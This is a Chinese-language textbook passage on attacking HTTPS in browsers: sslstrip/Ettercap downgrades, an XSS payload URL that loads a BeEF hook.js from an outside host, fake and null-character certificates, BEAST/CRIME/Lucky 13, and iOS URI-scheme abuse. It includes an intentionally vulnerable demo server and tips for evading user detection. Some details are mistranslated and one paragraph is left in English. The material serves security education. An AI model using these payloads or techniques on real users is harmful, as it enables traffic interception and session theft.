
# 当你需要攻击 HTTPS 通信时，特别是当会话 Cookie 只能通过 Secure 标记提交时会发生什么？

你有若干处理 HTTPS 页面的方法，但其中三种是相对容易实现的。让我们来探讨 HTTP 降级攻击、证书攻击以及 SSL/TLS 攻击。

## Downgrading HTTPS to HTTP

HTTPS 加密流量在传输过程中（理论上）除非你拥有解密密钥，否则无法查看。这意味着除非使用公开已知的方法，否则无法在传输中进行篡改和查看流量。这就是降级攻击出现的场景。

HTTP 降级攻击的目标是阻止用户访问 HTTPS 站点，或通过其他攻击将用户推回到 HTTP 版本的站点。如果你能强制浏览器访问 HTTP 版本的站点而不是 HTTPS 版本，你就可以在传输过程中查看敏感信息。你可以通过两种主要方式将请求从 HTTPS 重写为 HTTP：第一种是在网络上拦截数据并修改请求；第二种是在浏览器内部修改请求。

当浏览器从 HTTP 过渡到 HTTPS 时，拦截网络流量并进行重写是降级到 HTTP 的最简便方式。一些 Web 应用在收到 HTTP 请求后会返回 `302` 响应，将浏览器重定向到站点的 HTTPS 版本。这正是你需要掌控并介入的关键点。你可以使用像 `sslstrip` 这样的工具配合像 `Ettercap` 这样的 ARP Spoofing 工具来完成此操作，如第 2 章的“ARP Spoofing”部分简要说明。此过程相对简单，唯一的前提是服务器与客户端之间不存在双向认证（即 SSL 客户端证书）。

通过拦截网络流量并检测过渡（如 Figure 6-19 所示），你可以将所有 HTTPS 通信重写为 HTTP。在此情况下，你可以在本地管理 HTTP/HTTPS 过渡，从而查看所有应受保护的流量。目标只会看到 HTTP 流量，绝不会收到 HTTPS。结果是你与服务器通过 HTTPS 通信，而与目标浏览器通过 HTTP 通信。你实际上充当了加密终点。

start figure

**Figure 6-19:** 一个 Facebook 的 HTTP 到 HTTPS 重定向示例

![c06f019.tif](img/c06f019.png)

end figure

结合 `sslstrip` 和 `Ettercap` 还有其他好处。例如，你可以使用 `Ettercap` 过滤器在实时中操纵流量。在某些情况下，Web 应用开发者可能实现了自定义防护措施，虽然这类防御措施很少见，但它们可能阻碍可靠的 HTTP 降级。

这就是 `Ettercap` 的作用所在。它可以在实时中重写内容，以中和开发者的防御措施。提高此攻击可靠性的最简便方式是重写链接，指向恶意站点的副本，并希望用户不会察觉。说实话——如果你并没有真正阻止目标访问他们喜欢的搞笑猫咪站点，他们又会注意到吗？

第二种 HTTP 降级攻击是通过 JavaScript 在文档内部重写链接。目标是修改 DOM，使指向 HTTPS 的链接被改为 HTTP。对于存在 XSS 漏洞且已被钩选的站点，这是最简便的选择。其缺点是许多站点已通过仅通过 HTTPS 传输受保护内容来防御此攻击，这限制了直接重写内容的可能性。

为了进一步探讨，让我们查看一个存在 XSS 漏洞的示例页面。该页面有一个名为 `lang` 的输入参数，用于指定不同语言。该参数易受 XSS 攻击，因而可以用于将 BeEF 钩子注入目标浏览器：

```
require 'rubygems'

require 'thin'

require 'rack'

require 'sinatra'

require 'json'

class InjectDemo < Sinatra::Base

  get "/" do

    lang = request['lang'] || "en_US";

"

<div align=center>

To login, go to our secure login page at

<A HREF='https://servervictim.com/login?lang=#{lang}'>

https://servervictim.com/login

</A>

</div>"

  end

end

@routes = {

    "/" => InjectDemo.new

}

@rack_app = Rack::URLMap.new(@routes)

@thin = Thin::Server.new("servervictim.com", 4000, @rack_app)

Thin::Logging.silent = true

Thin::Logging.debug = false

puts "[#{Time.now}] Thin ready"

@thin.start
```

通过操纵 `lang` 变量，BeEF 钩子可以被注入。默认 `lang` 请求如 Figure 6-20 所示。

start figure

**Figure 6-20:** 未发生 XSS 的登录页面源码

![c06f020.tif](img/c06f020.png)

end figure

要创建 BeEF 钩子，你需要编写一个注入语句，它会关闭 A 标签、添加脚本，并确保链接仍然显示。下面的 URL 示例会将 BeEF 钩子注入页面：

```
http://servervictim.com:4000/?lang='><script src="http://browserhacker.com:3000/hook.js"></script>
```

一旦浏览器被 BeEF 钩选，你就可以将页面从 HTTPS 降级为 HTTP。在浏览器文件夹的 Hooked Domain 子文件夹中，有一个名为 “Replace HREFS (HTTPS)” 的模块。该模块会将页面上所有 HTTPS 链接替换为 HTTP 链接，如 Figure 6-21 所示。

start figure

**Figure 6-21:** BeEF 中的 HTTPS 降级模块

![c06f021.tif](img/c06f021.png)

end figure

模块运行后，除非用户仔细观察，否则变化不会很明显，因为 HTTPS 链接被替换为 HTTP 链接。敏锐的用户可能会注意到左下角的链接现在显示为 HTTP（如 Figure 6-22），但如果他们查看文档源码，页面仍显示为 HTTPS。

start figure

**Figure 6-22:** 新页面显示左下角的链接为 HTTP

![c06f022.eps](img/c06f022.png)

end figure

为了降低被检测的可能性，你可以在 `<a>` 元素上添加 `onclick` 事件，而不是直接修改 `href` 内容。这样在用户查看浏览器底部时，就不会察觉到 `https://` 已经消失。

这显然是一个简化的示例，但同类攻击几乎可以在任何存在 XSS 漏洞的页面上使用，而不仅仅是 URL。虽然 BeEF 并不自动执行所有这些操作，但仍可使用 BeEF 的 “Raw JavaScript” 模块将简单的 JavaScript 推送到目标浏览器。

## 攻击证书

证书攻击主要有两种变体。第一种是替换一个证书为另一个，操作简单但目标可见。第二种更为复杂，利用浏览器漏洞呈现一个会被浏览器错误信任的证书。该方法依赖于浏览器中存在的证书处理缺陷。虽然用户可能不会察觉到攻击正在进行，但实施难度更高。

### 使用假证书

创建假证书很容易，许多攻击工具已经包含假证书。无论你选择使用代理、`Ettercap` 或其他工具，思路都是一样的。你向目标浏览器展示一个假证书，并充当其通信的中间点。别忘了，由于你创建了证书，你也拥有解密密钥。因为你可以解密 HTTPS 流量，所以可以完全拦截并篡改数据。

显而易见的缺点是用户会看到一个弹出消息。该消息表明证书不适用于该站点。在这种攻击中，真正的问题是：你相信用户会在看到弹出消息后三思而后行吗？在某个时刻，每个人都曾在明明知道不该点击的情况下，点击了不受信任的证书对话框。如果有人在至理名言告诉你他们从未这样做过，那就让他们立刻回到他们的阿米什社区！

### 利用有缺陷的证书验证

另一种证书攻击利用了浏览器管理证书验证的缺陷。2013 年，这一攻击在多个 iPhone 应用中被发现。

Nick Arnott 发表了研究，指出许多流行的 iPhone 应用未检查证书是否有效。通过展示自签名证书或任何证书，这些应用不会提示用户服务器不可信。类似的安全问题也发现于各种 Android 应用中。例如，斯坦福大学和奥斯汀大学的研究小组发现 Chase 移动银行应用存在类似缺陷。利用这一证书处理漏洞，可以通过提供自签名证书并监控连接来获取凭证、信用卡数据或其他信息。

arguably the most notable of flawed certification validation vulnerabilities was Moxie Marlinspike’s null character exploit. This occurred when certain registrars would allow certificate requests with null characters. This doesn’t sound too malicious on its own, but when combined with the fact that the browsers were using C-based string functions without additional checks on the values, it became much more interesting.

当字符串检查函数查找数据时，它们会将 null 字符视为字符串的终止符。例如，正常的 `"hello"` 表示为 `"hello\0"`，其中 `\0` 是 null 字符的转义序列。

通过创建名为 `"www.google.com\0.browserhacker.com"` 的证书，注册机构会认为这是 `browserhacker.com` 的一部分，并知道该域名所有者可以为该域请求证书。然而，由于 null 前缀，当浏览器进行验证时，它会成功验证为 `www.google.com`。这将允许恶意人员创建包含 null 字符的证书，以冒充合法网站。

由于这些证书来自受信任的注册机构，浏览器不会质疑证书的有效性，也不会显示任何指示问题的弹出消息。这种攻击可以实现 SSL 窃听、篡改或其他攻击，而无需向目标表明任何异常。

这些攻击利用了浏览器中有缺陷的证书处理漏洞。尽管本文讨论的具体漏洞现已修复，研究人员仍在实现中发现问题。最终，这取决于在任何特定时间找到符合你特定情况的弱点。

## 攻击 SSL/TLS 层

安全套接层 `SSL` 及其后继的传输层安全 `TLS` 是安全网页浏览所使用的加密协议。像许多其他技术软件实现一样，它们也经历了自身的安全问题。利用这些弱点将允许披露通信通道的全部（或至少部分）内容。这些 SSL/TLS 层攻击通常不会在合理的时间内解密完整消息。但并非全然失望，因为它们可能揭示关键的 Cookie 数据或其他敏感信息，从而可用于进一步利用。在本文撰写时，已有三种获得知名度的攻击：BEAST 攻击、CRIME 攻击和 Lucky 13 攻击。

BEAST 攻击是首个高知名度的 SSL 攻击，它利用了 Cipher-Block-Chaining `CBC` 加密模式的弱点。通过利用这一 SSL 漏洞，可以解密加密消息的部分内容。利用此弱点，可以在约两秒钟内揭示加密消息的一块内容。真实的利用此攻击需要针对特定用户进行定位，并且需要几分钟才能获得消息的一小部分。攻击者可以在几分钟到几小时内确定会话 Cookie，以劫持会话。

CRIME 攻击是 BEAST 攻击的创建者（Juliano Rizzo 和 Thai Duong）随后的一次攻击。该攻击是 BEAST 释放后主要防御措施的回应。许多浏览器开发团队通过转向弱加密算法到 RC4 类加密算法来解决 BEAST 弱点。因此，CRIME 攻击应运而生，专门针对这类加密算法。它利用了 TLS 压缩的弱点来揭示数据。通过 JavaScript 和重复的网页请求，数据可以逐字节地确定。攻击者如果足够积极，结果类似于 BEAST 攻击。

最后值得一提的是 Lucky 13 攻击。该攻击使用与 BEAST 攻击类似的方法。然而，它利用了对 CBC 的填充 oracle 攻击来帮助猜测数据。与 BEAST 和 CRIME 类似，使用 JavaScript 大幅加速了过程，但仍仅适用于单个目标。

* * *

**什么是填充 oracle 攻击？** 你可能在想，如何能够通过填充 oracle 数据库进行攻击？这些攻击实际上与 Oracle 产品或系统（包括其数据库系统）无关。填充 oracle 攻击是解密过程中的信息泄露结果。虽然泄露的信息可能不是完整的明文，但在某些情况下，仍有可行的方式确定内容。深入的密码学攻击技术超出了本书的范围，但如果你感兴趣，有大量公开研究可供深入探讨。

* * *

尽管加密层漏洞能够有效展示 SSL/TLS 实现的弱点，但它们对于大规模攻击并不特别有用。要在合理的时间内执行这些攻击，你还需要找到能够在网站上实现 JavaScript 注入的弱点。不过，如果你有耐心并且可以长时间观察目标，即使是那些看似安全的网站仍可能受到攻击。

# 滥用方案

URI 方案是 URI 或 URL 中冒号 `:` 字符之前的第一部分。URI 方案在浏览器上下文中具有双重用途。首先，方案是一种方法，允许不同协议通过浏览器访问，例如 FTP 或 HTTPS。如果一个 URL 以 `ftp:` 开头，浏览器知道应使用 FTP 协议而非 HTTP 协议来建立连接。

第二种方案的功能是允许浏览器启动不同的本地行为。这有时包括打开新的应用程序。`mailto:` 方案就是一个例子。如果 HTML 网页中的锚标签包含 `mailto:` 链接，点击时，浏览器通常会打开外部应用程序来发送电子邮件。

## 滥用 iOS

当浏览器使用特定方案在另一个应用程序中执行操作时，可能会为你提供额外的攻击向量。这在 Nitesh Dhanjani 于 2010 年发表的关于 Apple iOS 中 URI 方案不安全处理的研究中被突出显示。23

Dhanjani 的研究探讨了原生 iOS 协议处理例程，例如 `tel:` 处理器。如果 iOS Safari 浏览器请求一个 URL，例如 `tel:613-966-94916`，电话应用程序将启动并提示用户开始拨打建议的号码，如图 6-23 所示。Figure 6-23

start figure

**Figure 6-23:** iOS 处理 `tel:` 方案

![c06f023.tif](img/c06f023.png)

end figure

这一例子未必表明实现不安全，因为电话应用程序仍会在继续之前提示用户确认通话。你可能会运气好，目标用户意外点击呼叫选项。但这非常不太可能，让我们再看看另一个例子。

Skype 并未随 iOS 打包，但它使用自己独特的方案。为了让其他应用程序利用自定义 URI 方案，Apple 在其 `Info.plist` 规范中包含 `CFBundleURLTypes` 数组类型。这可以在下面的 `Info.plist` 文件片段中看到：

```
<key>CFBundleURLTypes</key>
  <array>
    <dict>
      <key>CFBundleURLName</key>
        <string>com.skype.skype</string>
      <key>CFBundleURLSchemes</key>
        <array>
          <string>skype</string>
        </array>
    </dict>
  </array>
```
